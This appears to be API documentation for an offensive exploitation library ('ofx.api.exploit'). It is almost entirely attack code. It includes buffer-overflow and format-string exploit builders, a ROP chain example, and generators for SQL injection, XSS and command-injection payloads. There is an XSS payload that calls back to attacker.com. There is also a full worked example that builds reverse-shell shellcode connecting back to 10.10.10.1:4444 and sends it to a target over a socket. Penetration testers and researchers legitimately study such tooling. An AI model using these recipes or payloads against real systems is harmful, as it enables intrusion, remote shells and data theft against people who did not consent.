# Exploitation API

Exploitation utilities including generic exploit frameworks and helpers.

## Module: `ofx.api.exploit`

Provides generic exploitation utilities and helpers for vulnerability exploitation.

## Functions

### exploit_format_string

Format string vulnerability exploitation helper.

```python
from ofx.api.exploit import exploit_format_string

# Find offset
offset = exploit_format_string.find_offset(
    target_func=vulnerable_function,
    start=1,
    end=100
)

# Generate payload
payload = exploit_format_string.generate_payload(
    offset=offset,
    target_addr=0xdeadbeef,
    value=0x41414141
)
```

### exploit_buffer_overflow

Buffer overflow exploitation utilities.

```python
from ofx.api.exploit import exploit_buffer_overflow

# Generate pattern
pattern = exploit_buffer_overflow.create_pattern(length=1000)

# Find offset from crash
offset = exploit_buffer_overflow.find_offset(pattern, "Aa0Aa1Aa2")

# Build exploit
exploit = exploit_buffer_overflow.build_exploit(
    offset=offset,
    ret_addr=0x08048484,
    nop_sled=100,
    shellcode=shellcode_bytes
)
```

### exploit_rop

Return-Oriented Programming (ROP) chain builder.

```python
from ofx.api.exploit import exploit_rop

# Build ROP chain
rop_chain = exploit_rop.build_chain([
    0x08048100,  # pop eax; ret
    0xdeadbeef,  # value for eax
    0x08048200,  # pop ebx; ret  
    0xcafebabe,  # value for ebx
    0x08048300,  # int 0x80
])
```

## Classes

### ExploitBuilder

High-level exploit building interface.

```python
from ofx.api.exploit import ExploitBuilder

builder = ExploitBuilder(target_arch="x86")

# Add components
builder.add_nop_sled(100)
builder.add_shellcode(shellcode_bytes)
builder.add_padding(offset - len(shellcode_bytes) - 100)
builder.add_return_address(0x08048484)

# Generate exploit
exploit = builder.build()
```

### PayloadGenerator

Generate common exploit payloads.

```python
from ofx.api.exploit import PayloadGenerator

gen = PayloadGenerator()

# SQL injection payloads
sqli_payloads = gen.generate_sqli(
    technique="union",
    columns=5,
    table="users"
)

# XSS payloads
xss_payloads = gen.generate_xss(
    context="html",
    callback_url="http://attacker.com/xss"
)

# Command injection
cmdi_payloads = gen.generate_command_injection(
    command="whoami",
    os="linux"
)
```

## Examples

### Buffer Overflow Exploitation

```python
from ofx.api.exploit import exploit_buffer_overflow
from ofx.api.shellcode import ShellGenerator

# Generate shellcode
shell_gen = ShellGenerator("linux", "x64")
shellcode, _ = shell_gen.get_shellcode(
    "reverse",
    connectback_ip="10.10.10.1",
    connectback_port=4444
)

# Find offset (from testing)
offset = 512

# Build exploit
nop_sled = b"\x90" * 100
padding = b"A" * (offset - len(shellcode) - len(nop_sled))
ret_addr = struct.pack("<Q", 0x7fffffffe000)  # Stack address

exploit = nop_sled + shellcode + padding + ret_addr

# Send exploit
import socket
s = socket.socket()
s.connect(("target.com", 9999))
s.send(exploit)
```

### Format String Exploitation

```python
from ofx.api.exploit import exploit_format_string

# Target: overwrite GOT entry
target_addr = 0x0804a018  # GOT address
target_value = 0x08048484  # Our shellcode address

# Generate payload
payload = exploit_format_string.generate_write_payload(
    address=target_addr,
    value=target_value,
    offset=4  # Format string offset
)

# Send payload
import requests
requests.get(f"http://target.com/?name={payload}")
```

## See Also

- [Shellcode API](shellcode.md)
- [HTTP API](http.md)
- [Webshell API](webshell.md)
